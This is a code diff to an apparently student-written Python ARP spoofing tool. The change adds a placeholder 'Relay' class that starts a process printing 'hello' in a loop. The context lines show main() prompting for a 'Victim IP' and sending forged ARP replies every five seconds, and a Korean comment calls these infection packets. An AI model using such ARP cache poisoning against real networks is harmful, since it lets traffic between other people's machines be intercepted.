@@ -9,8 +9,10 @@ import re
 import time
 import subprocess
 import binascii
+
 from socket import *
 
+from multiprocessing import current_process, Process
 from packet_header_define import *
 from struct import unpack
 
@@ -188,7 +190,30 @@ class ARP:
                 return mac
 
 
+class Relay:
+
+    def __init__(self, name):
+        self.name = name
+
+    # Semi-Class Method
+    def run(self):
+        p = Process(target=self.relay, args=('hello',))
+        p.start()
+
+    def relay(self, data):
+        import time
+        while True:
+            print(data)
+            time.sleep(0.3)
+
+    def __repr__(self):
+        return "<%s>" % self.name
+
+
 def main():
+    r = Relay('Main Relay')
+    r.run()
+
     victim_ip = input("Victim IP: ")
     arp = ARP(victim_ip)
 
@@ -198,6 +223,7 @@ def main():
     while True:
         arp.send_arp(ARP_REPLY_OP)
         time.sleep(5)  # 5초 마다 감염 패킷 전송
+
 
 if __name__ == '__main__':
     main()
